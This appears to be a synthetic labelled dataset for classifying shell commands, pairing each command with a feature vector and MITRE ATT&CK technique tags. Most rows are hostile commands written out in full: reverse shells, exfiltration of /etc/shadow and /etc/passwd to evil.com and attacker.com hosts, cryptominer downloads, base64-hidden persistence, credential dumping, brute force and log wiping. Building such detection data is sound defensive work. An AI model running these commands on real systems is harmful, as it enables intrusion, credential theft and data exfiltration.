"python3 -c ""import os; os.system('id')""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1059_Command_and_Scripting_Interpreter'],synthetic
wget -q http://miner.com/xmrig -O /tmp/xmr && chmod +x /tmp/xmr && /tmp/xmr -o pool.minexmr.com:443,"[0, 1, 1, 1, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.52, 1, 1]",['T1496_Resource_Hijacking'],synthetic
curl -s http://c2.attacker.com/beacon,"[0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1041_Exfiltration_Over_C2_Channel'],synthetic
nc -zv 10.0.0.1 1-1000 2>&1 | grep succeeded,"[1, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.32, 1, 0]",['T1046_Network_Service_Scanning'],synthetic
echo  'YXJwIC1h'  |  base64  -d  |  bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1016_System_Network_Config_Discovery', 'T1027_Obfuscated_Files_or_Information']",synthetic
net user /domain,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1087_Account_Discovery'],synthetic
nohup cat /etc/group | > /dev/null 2>&1 &,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.2, 0.32, 1, 0]","['T1069_Permission_Groups_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
psexec.py Administrator:password@10.0.0.5 cmd.exe | chmod +x /tmp/payload,"[1, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.2, 0.28, 1, 1]","['T1021_Remote_Services', 'T1059_Command_and_Scripting_Interpreter']",synthetic
time hostnamectl,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.08, 0, 0]",['T1082_System_Information_Discovery'],synthetic
nohup python3 exploit.py --target localhost | sleep 1 &,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.36, 1, 0]","['T1068_Exploitation_for_Privilege_Escalation', 'T1059_Command_and_Scripting_Interpreter']",synthetic
"bash -c ""echo -e '\x2f\x62\x69\x6e\x2f\x62\x61\x73\x68' && sleep 1""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0.0, 0.32, 1, 0]","['T1027_Obfuscated_Files_or_Information', 'T1059_Command_and_Scripting_Interpreter']",synthetic
"bash -c ""echo 'cmVnIGFkZCBIS0xNXFNvZnR3YXJlXE1pY3Jvc29mdFxXaW5kb3dzXEN1cnJlbnRWZXJzaW9uXFJ1biAvdiBCYWNrZG9vciAvZCBDOlxwYXlsb2FkLmV4ZQ==' | base64 -d | bash""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.36, 1, 0]","['T1112_Modify_Registry', 'T1027_Obfuscated_Files_or_Information']",synthetic
"bash -c ""nohup ./xmrig --url stratum+tcp://pool.minexmr.com:443 --user wallet & | chmod +x /tmp/payload""","[0, 0, 0, 1, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.2, 0.52, 1, 1]","['T1496_Resource_Hijacking', 'T1059_Command_and_Scripting_Interpreter']",synthetic
wget  --post-file=/etc/passwd  http://attacker.com/receive  ;  >  /dev/null  2>&1,"[0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.0, 0.28, 1, 0]","['T1041_Exfiltration_Over_C2_Channel', 'T1059_Command_and_Scripting_Interpreter']",synthetic
unzip  archive.zip  -d  /opt/,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0.0, 0.16, 0, 0]",['BENIGN'],synthetic
time cat /tmp/encoded | xxd -r -p | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.4, 0.36, 1, 0]",['T1027_Obfuscated_Files_or_Information'],synthetic
pip install requests,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['BENIGN'],synthetic
echo 'cG93ZXJzaGVsbC5leGUgLUVuY29kZWRDb21tYW5kIEpBQnpBLi4u' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
echo 'aGVsbG8=' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]",['T1027_Obfuscated_Files_or_Information'],synthetic
traceroute google.com,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.08, 0, 0]",['BENIGN'],synthetic
ln  -s  /tmp/backdoor.sh  /etc/cron.d/system-update  |  history  -c,"[0, 0, 0, 0, 0, 0, 1, 0, 1, 0, 0, 0, 0, 0, 0, 0.2, 0.28, 1, 0]","['T1053_Scheduled_Task', 'T1059_Command_and_Scripting_Interpreter']",synthetic
"bash -c ""bash -i >& /dev/tcp/10.0.0.99/4444 0>&1 && > /dev/null 2>&1""","[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.0, 0.44, 1, 0]",['T1059_Command_and_Scripting_Interpreter'],synthetic
getent group sudo,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1069_Permission_Groups_Discovery'],synthetic
New-ItemProperty -Path 'HKLM:\...' -Name Persist -Value 'C:\payload.exe',"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.28, 0, 0]",['T1112_Modify_Registry'],synthetic
time nmap --script=vuln 10.0.0.1,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.16, 0, 0]",['T1046_Network_Service_Scanning'],synthetic
id  -Gn,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.08, 0, 0]",['T1069_Permission_Groups_Discovery'],synthetic
echo 'ZWNobyAnQHJlYm9vdCAvdG1wL2JhY2tkb29yLnNoJyB8IGNyb250YWIgLQ==' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1053_Scheduled_Task', 'T1027_Obfuscated_Files_or_Information']",synthetic
nc -zv 10.0.0.1 1-1000 2>&1 | grep succeeded,"[1, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.32, 1, 0]",['T1046_Network_Service_Scanning'],synthetic
"python3 -c ""import urllib.request; urllib.request.urlopen('http://evil.com/?' + open('/etc/shadow').read())""","[0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.28, 0, 0]",['T1041_Exfiltration_Over_C2_Channel'],synthetic
whoami  /all  |  chmod  +x  /tmp/payload,"[0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.2, 0.24, 1, 0]","['T1033_System_Owner_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
time echo hello world,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['BENIGN'],synthetic
nohup id -Gn ; history -c &,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0.0, 0.28, 1, 0]","['T1069_Permission_Groups_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
"python3 -c ""import urllib.request; urllib.request.urlretrieve('http://evil.com/payload', '/tmp/payload')""","[0, 1, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 0, 0]",['T1105_Ingress_Tool_Transfer'],synthetic
"bash -c ""ip neigh show""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1016_System_Network_Config_Discovery'],synthetic
echo  'c3lzdGVtY3RsIGVuYWJsZSAtLW5vdyBtYWxpY2lvdXMuc2VydmljZQ=='  |  base64  -d  |  bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1053_Scheduled_Task', 'T1027_Obfuscated_Files_or_Information']",synthetic
echo 'ZWNobyAnQHJlYm9vdCAvdG1wLy54bXIveG1yaWcgLW8gcG9vbC5taW5leG1yLmNvbScgfCBjcm9udGFiIC0=' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1496_Resource_Hijacking', 'T1027_Obfuscated_Files_or_Information']",synthetic
nohup echo 'compromised ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers | echo done &,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.44, 1, 0]","['T1098_Account_Manipulation', 'T1059_Command_and_Scripting_Interpreter']",synthetic
ssh -L 8080:internal:80 user@jump.host,"[0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1021_Remote_Services'],synthetic
"bash -c ""gcc exploit.c -o exploit && ./exploit""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.32, 1, 0]",['T1068_Exploitation_for_Privilege_Escalation'],synthetic
time wmiexec.py domain/admin:pass@10.0.0.5,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1021_Remote_Services'],synthetic
"bash -c ""su -s /bin/bash www-data""","[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 0, 0]",['T1078_Valid_Accounts'],synthetic
net user /add attacker P@ssw0rd,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1136_Create_Account'],synthetic
arp-scan --localnet | echo done,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.2, 0.2, 1, 0]","['T1018_Remote_System_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
"bash -c ""procdump.exe -ma lsass.exe lsass.dmp""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 0, 0]",['T1003_OS_Credential_Dumping'],synthetic
"sudo python3 -c ""import urllib.request; urllib.request.urlretrieve('http://evil.com/payload', '/tmp/payload')""","[0, 1, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.28, 0, 0]",['T1105_Ingress_Tool_Transfer'],synthetic
netstat  -tulpn,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.08, 0, 0]",['BENIGN'],synthetic
sudo smbclient //10.0.0.5/C$ -U Administrator,"[1, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1021_Remote_Services'],synthetic
ln -s /tmp/backdoor.sh /etc/cron.d/system-update,"[0, 0, 0, 0, 0, 0, 1, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1053_Scheduled_Task'],synthetic
wmiexec.py domain/admin:pass@10.0.0.5,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.08, 0, 0]",['T1021_Remote_Services'],synthetic
curl  -A  'Mozilla/5.0'  http://c2.attacker.com/check-in,"[0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1071_Application_Layer_Protocol'],synthetic
nmap -sn 192.168.1.0/24,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.12, 0, 0]",['T1018_Remote_System_Discovery'],synthetic
nohup for p in $(cat passwords.txt); do sshpass -p $p ssh root@10.0.0.1 id; done &,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.6, 0, 0]",['T1110_Brute_Force'],synthetic
"python3 -c ""import urllib.request; urllib.request.urlretrieve('http://evil.com/payload', '/tmp/payload')""","[0, 1, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 0, 0]",['T1105_Ingress_Tool_Transfer'],synthetic
tftp -i 10.0.0.99 GET payload.exe C:\Windows\Temp\payload.exe,"[1, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 0, 0]",['T1105_Ingress_Tool_Transfer'],synthetic
reg delete HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v Defender,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1112_Modify_Registry'],synthetic
nmap -sV --version-intensity 5 -p 1-65535 10.0.0.1,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.28, 0, 0]",['T1046_Network_Service_Scanning'],synthetic
locate wp-config.php | history -c,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.2, 0.2, 1, 0]","['T1083_File_and_Directory_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
hydra  -l  admin  -P  /usr/share/wordlists/rockyou.txt  ssh://10.0.0.1,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 0, 0]",['T1110_Brute_Force'],synthetic
usermod -aG sudo compromised_user,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1098_Account_Manipulation'],synthetic
"python3 -c ""exec(__import__('base64').b64decode('aW1wb3J0IG9z').decode())""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1027_Obfuscated_Files_or_Information'],synthetic
sudo echo '' > /var/log/syslog,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1070_Indicator_Removal'],synthetic
nmap -sV --version-intensity 5 -p 1-65535 10.0.0.1 ; chmod +x /tmp/payload,"[1, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1, 0, 0.0, 0.44, 1, 1]","['T1046_Network_Service_Scanning', 'T1059_Command_and_Scripting_Interpreter']",synthetic
ls -la /root /etc /var/www | history -c,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.2, 0.32, 1, 0]","['T1083_File_and_Directory_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
nohup echo 'c3NoIGFkbWluQGxvY2FsaG9zdA==' | base64 -d | bash &,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.36, 1, 0]","['T1078_Valid_Accounts', 'T1027_Obfuscated_Files_or_Information']",synthetic
sha256sum  /etc/passwd,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.08, 0, 0]",['BENIGN'],synthetic
echo 'cG93ZXJzaGVsbC5leGUgLUVuY29kZWRDb21tYW5kIEpBQnpBLi4u' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
wget -q http://miner.com/xmrig -O /tmp/xmr && chmod +x /tmp/xmr && /tmp/xmr -o pool.minexmr.com:443,"[0, 1, 1, 1, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.52, 1, 1]",['T1496_Resource_Hijacking'],synthetic
ps aux | grep nginx,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.2, 0.2, 1, 0]",['BENIGN'],synthetic
mkdir -p /opt/myapp,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['BENIGN'],synthetic
nohup hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://10.0.0.1 ; chmod +x /tmp/payload &,"[1, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.48, 1, 1]","['T1110_Brute_Force', 'T1059_Command_and_Scripting_Interpreter']",synthetic
secretsdump.py -just-dc-user Administrator domain/user:pass@DC,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1003_OS_Credential_Dumping'],synthetic
nc -zv 10.0.0.1 1-1000 2>&1 | grep succeeded,"[1, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.32, 1, 0]",['T1046_Network_Service_Scanning'],synthetic
"nmap -sV -p 22,80,443 10.0.0.0/24","[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.2, 0, 0]",['T1018_Remote_System_Discovery'],synthetic
time nc -zv 10.0.0.1 1-1000 2>&1 | grep succeeded,"[1, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.36, 1, 0]",['T1046_Network_Service_Scanning'],synthetic
locate wp-config.php,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.08, 0, 0]",['T1083_File_and_Directory_Discovery'],synthetic
"bash -c ""curl -s http://c2.attacker.com/beacon""","[0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1041_Exfiltration_Over_C2_Channel'],synthetic
sudo -u www-data bash,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1078_Valid_Accounts'],synthetic
dmesg | head -20,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.16, 1, 0]",['T1082_System_Information_Discovery'],synthetic
curl  -X  POST  http://evil.com/collect  -d  @/etc/shadow,"[0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 0, 0]",['T1041_Exfiltration_Over_C2_Channel'],synthetic
cat /etc/hosts,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.08, 0, 0]",['BENIGN'],synthetic
sudo wget -q -O- --header='X-Auth: token123' http://evil.com/cmd,"[0, 1, 1, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.28, 0, 0]",['T1071_Application_Layer_Protocol'],synthetic
sudo perl -e 'use Socket; ...',"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 0, 0]",['T1059_Command_and_Scripting_Interpreter'],synthetic
sudo dmesg | head -20,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.2, 1, 0]",['T1082_System_Information_Discovery'],synthetic
ssh -i ~/.ssh/stolen_key root@10.0.0.5 ; chmod +x /tmp/payload,"[1, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.32, 1, 1]","['T1021_Remote_Services', 'T1059_Command_and_Scripting_Interpreter']",synthetic
chmod 644 /etc/hosts,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['BENIGN'],synthetic
find  /home  -name  '.env'  2>/dev/null  &&  echo  done,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.0, 0.32, 1, 0]","['T1083_File_and_Directory_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
time echo 'dw==' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.32, 1, 0]","['T1033_System_Owner_Discovery', 'T1027_Obfuscated_Files_or_Information']",synthetic
su -s /bin/bash www-data,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1078_Valid_Accounts'],synthetic
sudo echo 'TmV3LUl0ZW1Qcm9wZXJ0eSAtUGF0aCAnSEtMTTpcLi4uJyAtTmFtZSBQZXJzaXN0IC1WYWx1ZSAnQzpccGF5bG9hZC5leGUn' | base64 -d | bash,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.32, 1, 0]","['T1112_Modify_Registry', 'T1027_Obfuscated_Files_or_Information']",synthetic
cat /tmp/encoded | xxd -r -p | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.4, 0.32, 1, 0]",['T1027_Obfuscated_Files_or_Information'],synthetic
adduser --shell /bin/bash --disabled-password backdoor | > /dev/null 2>&1,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.2, 0.36, 1, 0]","['T1136_Create_Account', 'T1059_Command_and_Scripting_Interpreter']",synthetic
"bash -c ""certutil.exe -urlcache -split -f http://attacker.com/nc.exe nc.exe""","[0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0.0, 0.32, 0, 0]",['T1105_Ingress_Tool_Transfer'],synthetic
echo 'bWltaWthdHouZXhlICdzZWt1cmxzYTo6bG9nb25wYXNzd29yZHMnIGV4aXQgJiYgaGlzdG9yeSAtYw==' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1003_OS_Credential_Dumping', 'T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
sudo echo 'PiB+Ly5iYXNoX2hpc3RvcnkgJiYgaGlzdG9yeSAtYw==' | base64 -d | bash,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.32, 1, 0]","['T1070_Indicator_Removal', 'T1027_Obfuscated_Files_or_Information']",synthetic
find / -writable -type d 2>/dev/null,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.0, 0.24, 0, 0]",['T1083_File_and_Directory_Discovery'],synthetic
su -s /bin/bash www-data && history -c,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.0, 0.28, 1, 0]","['T1078_Valid_Accounts', 'T1059_Command_and_Scripting_Interpreter']",synthetic
whoami /all ; chmod +x /tmp/payload,"[0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 1, 1]","['T1033_System_Owner_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
w,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.04, 0, 0]",['T1033_System_Owner_Discovery'],synthetic
ls -la /root /etc /var/www,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1083_File_and_Directory_Discovery'],synthetic
cat /etc/passwd | grep -v nologin,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.24, 1, 0]",['T1003_OS_Credential_Dumping'],synthetic
wget  -q  -O-  --header='X-Auth:  token123'  http://evil.com/cmd  |  echo  done,"[0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.36, 1, 0]","['T1071_Application_Layer_Protocol', 'T1059_Command_and_Scripting_Interpreter']",synthetic
"bash -c ""echo 'd2dldCAtLXBvc3QtZmlsZT0vZXRjL3Bhc3N3ZCBodHRwOi8vYXR0YWNrZXIuY29tL3JlY2VpdmU=' | base64 -d | bash""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.36, 1, 0]","['T1041_Exfiltration_Over_C2_Channel', 'T1027_Obfuscated_Files_or_Information']",synthetic
time cat /etc/shadow | nc 10.0.0.99 4444,"[1, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.28, 1, 0]",['T1041_Exfiltration_Over_C2_Channel'],synthetic
time cat /etc/passwd | awk -F: '$3 >= 1000',"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.36, 1, 0]",['T1087_Account_Discovery'],synthetic
time unset HISTFILE; export HISTSIZE=0,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1070_Indicator_Removal'],synthetic
ssh -L 8080:internal:80 user@jump.host,"[0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1021_Remote_Services'],synthetic
dmidecode -t system,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1082_System_Information_Discovery'],synthetic
"bash -c ""id""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1033_System_Owner_Discovery'],synthetic
./dirtycow /etc/passwd 'root::0:0:root:/root:/bin/bash' | chmod +x /tmp/payload,"[0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.2, 0.28, 1, 1]","['T1068_Exploitation_for_Privilege_Escalation', 'T1059_Command_and_Scripting_Interpreter']",synthetic
find  /home  -name  '.env'  2>/dev/null  &&  echo  done,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.0, 0.32, 1, 0]","['T1083_File_and_Directory_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
echo 'ZWNobyAnYUdWc2JHOD0nIHwgYmFzZTY0IC1kIHwgYmFzaA==' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]",['T1027_Obfuscated_Files_or_Information'],synthetic
echo  'cHl0aG9uMyAtYyAiaW1wb3J0IHVybGxpYi5yZXF1ZXN0OyB1cmxsaWIucmVxdWVzdC51cmxyZXRyaWV2ZSgnaHR0cDovL2V2aWwuY29tL3BheWxvYWQnLCAnL3RtcC9wYXlsb2FkJyki'  |  base64  -d  |  bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1105_Ingress_Tool_Transfer', 'T1027_Obfuscated_Files_or_Information']",synthetic
"bash -c ""find / -name 'id_rsa' 2>/dev/null | > /dev/null 2>&1""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.2, 0.44, 1, 0]","['T1003_OS_Credential_Dumping', 'T1059_Command_and_Scripting_Interpreter']",synthetic
nohup  ./xmrig  --url  stratum+tcp://pool.minexmr.com:443  --user  wallet  &,"[0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.28, 0, 0]",['T1496_Resource_Hijacking'],synthetic
systemctl restart nginx,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['BENIGN'],synthetic
ssh -i ~/.ssh/stolen_key root@10.0.0.5,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1021_Remote_Services'],synthetic
secretsdump.py -just-dc-user Administrator domain/user:pass@DC,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1003_OS_Credential_Dumping'],synthetic
echo 'd2hvYW1pIC9hbGwgfCBoaXN0b3J5IC1j' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1033_System_Owner_Discovery', 'T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
adduser --shell /bin/bash --disabled-password backdoor,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1136_Create_Account'],synthetic
